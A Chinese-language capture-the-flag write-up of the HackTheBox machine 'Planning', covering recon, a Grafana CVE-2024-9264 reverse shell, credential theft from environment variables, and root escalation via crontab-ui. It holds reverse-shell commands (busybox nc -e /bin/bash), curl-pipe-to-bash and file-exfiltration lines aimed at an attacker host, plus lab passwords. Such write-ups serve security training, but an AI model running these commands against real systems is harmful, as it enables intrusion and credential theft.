---
title: HTB-Easy Planning Write UP
date: 2025-06-15 16:04:00 +0800
last_modified_at: 2025-06-15 16:04:00 +0800
categories: [HTB]
tags: [HTB]
math: true
mermaid: true
---


- [0x01 Nmap扫描](#0x01-nmap扫描)
- [0x02 目录爆破](#0x02-目录爆破)
- [0x03 子域名爆破](#0x03-子域名爆破)
- [0x04 开始渗透](#0x04-开始渗透)
  - [Grafana RCE CVE-2024-9264](#grafana-rce-cve-2024-9264)
  - [检查是否是Docker容器环境](#检查是否是docker容器环境)
  - [使用linpeas本地提权信息收集](#使用linpeas本地提权信息收集)
  - [进行提权](#进行提权)
    - [Polkit权限策略分析提权](#polkit权限策略分析提权)
      - [✅ 推荐步骤汇总：](#-推荐步骤汇总)
    - [另一种提权方法](#另一种提权方法)


# 0x01 Nmap扫描
```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -p- -sV -A --min-rate 4000 10.10.11.68
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 08:10 EDT
Nmap scan report for 10.10.11.68 (10.10.11.68)
Host is up (0.68s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# 0x02 目录爆破

`vim /etc/hosts`

添加一行`10.10.11.68	planning.htb`

目录扫描没发现，然后进行子域名爆破

# 0x03 子域名爆破

`ffuf -u 'http://planning.htb' -H 'host:FUZZ.planning.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -c -t 300 -fs 178`

***发现304重定向***
```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u 'http://planning.htb' -H 'host:FUZZ.planning.htb' -w /home/kali/Desktop/sub_domain.txt -c -t 300 -fs 178 

        /'___\  /'___\           /'___\       
    /\ \__/ /\ \__/  __  __  /\ \__/       
    \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
        \ \_\   \ \_\  \ \____/  \ \_\       
        \/_/    \/_/   \/___/    \/_/       

    v2.1.0-dev
________________________________________________

:: Method           : GET
:: URL              : http://planning.htb
:: Wordlist         : FUZZ: /home/kali/Desktop/sub_domain.txt
:: Header           : Host: FUZZ.planning.htb
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 300
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
:: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 703ms]
```

再次在hots文件添加一行：`10.10.11.68	grafana.planning.htb`

浏览器打开是登录界面

# 0x04 开始渗透

##  Grafana RCE CVE-2024-9264

发现当前Grafana版本为V11.0.0，根据提供账号密码登录进后台。

发现Grafana存在RCE：CVE-2024-9264

先开启监听：`nc -lvp 9001`

再执行poc：`python3 CVE-2024-9264.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.16.18 --reverse-port 9001`

反弹shell：

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvp 9001
listening on [any] 9001 ...
connect to [10.10.16.18] from planning.htb [10.10.11.68] 35730
sh: 0: can't access tty; job control turned off
# whoami
root
```

## 检查是否是Docker容器环境
```bash
# ls -la / | grep .dockerenv 
-rwxr-xr-x   1 root root    0 Apr  4 10:23 .dockerenv
# hostname
7ce659d667d7
```
## 使用linpeas本地提权信息收集

- kali开启python http.server 服务
```bash
python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
---
- 容器download脚本并运行

```bash
wget http://10.10.16.18:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
OR
curl -sL http://10.10.16.18:8000/linpeas.sh | bash
```

---
**输出：**
```
╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
AWS_AUTH_AssumeRoleEnabled=true
AWS_AUTH_EXTERNAL_ID=
AWS_AUTH_SESSION_DURATION=15m
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_HOME=/usr/share/grafana
GF_PATHS_LOGS=/var/log/grafana
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
SHLVL=0
SHLVL=1
_=/usr/bin/bash
_=/usr/bin/cat
_=/usr/bin/dd
_=/usr/bin/grep
_=/usr/bin/sh
_=/usr/bin/tr
```
---
发现环境变量里存在ADMIN用户凭据`enzo/RioTecRANDEntANT!`

尝试SSH登录：
```bash
ssh enzo@10.10.11.68
enzo@10.10.11.68's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)
enzo@planning:~$ whoami
enzo
```
***获取USER_FLAG***

```bash
enzo@planning:~$ cat user.txt
6beb5a1d79a1aafbd6ff92f505d9f2d7

enzo@planning:/tmp$ id
uid=1000(enzo) gid=1000(enzo) groups=1000(enzo)
```
无法获取root的flag

## 进行提权

- **反向传linpeas分析结果到Kali**

在 Kali开python3服务接收上传
```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# apt install pipx
pipx 已经是最新版 (1.7.1-1)。

┌──(root㉿kali)-[/home/kali/Desktop]
└─# pipx install uploadserver
  installed package uploadserver 6.0.0, installed using Python 3.13.2
  These apps are now globally available
    - uploadserver

┌──(root㉿kali)-[/home/kali/Desktop]
└─# ~/.local/bin/uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

在靶机上将linpeas.sh保存为文件并POST上传到Kali
```bash
enzo@planning:~$ ./linpeas.sh | tee linpeas_output.txt

enzo@planning:~$ curl -X POST http://10.10.16.18:8000/upload -F 'files=@linpeas_output.txt'
```

Kali收到输出文件
```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# ~/.local/bin/uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.68 - - [15/Jun/2025 01:29:05] [Uploaded] "linpeas_output.txt" --> /home/kali/Desktop/linpeas_output.txt
10.10.11.68 - - [15/Jun/2025 01:29:05] "POST /upload HTTP/1.1" 204 -
```

- **将结果上传CHAT-GPT进行分析**

### Polkit权限策略分析提权

#### ✅ 推荐步骤汇总：

1. **首先尝试：**

   ```bash
   /tmp/bash -p
   whoami
   ```

2. **如果无效，再试 CVE-2021-3156 或 CVE-2021-4034（pwnkit）**

3. **检查 container 逃逸可行性，尝试 `unshare` 等工具**

4. **结合 capabilities 和 suid 程序找提权点**
```bash
enzo@planning:~$ /tmp/bash -p
bash-5.2# whoami
root
bash-5.2# cat /root/root.txt
794eb8b85207943119ea5def75c0d091
```

### 另一种提权方法

在linpeas输出中发现crontab-ui进程：
```bash
╔══════════╣ Analyzing Github Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/balanced-match/.github
drwxr-xr-x 3 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/busboy/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/call-bind-apply-helpers/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/call-bound/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/dunder-proto/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/es-define-property/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/es-errors/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/es-object-atoms/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/filelist/node_modules/brace-expansion/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/function-bind/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/get-intrinsic/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/get-proto/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/gopd/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/hasown/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/has-symbols/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/math-intrinsics/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/minimist/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/object-inspect/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/qs/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/side-channel/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/side-channel-list/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/side-channel-map/.github
drwxr-xr-x 2 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/side-channel-weakmap/.github
drwxr-xr-x 3 root root 4096 Feb 28 19:03 /usr/lib/node_modules/crontab-ui/node_modules/streamsearch/.github
```

**又发现疑似存在crontab配置文件**

```bash
╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /opt/crontabs/crontab.db: New Line Delimited JSON text data                                                                                                                 
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 5, database pages 967, cookie 0x4, schema 4, U
TF-8, version-valid-for 5
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 6, database pages 16, cookie 0x5, schema 4, UTF-8, version-
valid-for 6
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8,
 version-valid-for 5

 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)                                                                                                                   
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)          
```

**查看crontab.db**

```bash
enzo@planning:~$ cat /opt/crontabs/crontab.db
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```
`crontab.db`文件内容中包含参数`-P P4ssw0rdS0pRi0T3c`，这极有可能是`crontab-ui`的登录密码。

然后使用`root/P4ssw0rdS0pRi0T3c`登录crontab-ui，然后添加任务：

```bash
cat /root/root.txt > /tmp/flag
OR
busybox nc 10.10.16.18 4444 -e /bin/bash
```
*注意由于目标机nc不支持`-e`参数，所以*`nc 10.10.16.18 4444 -e /bin/bash`*反弹shell失败*

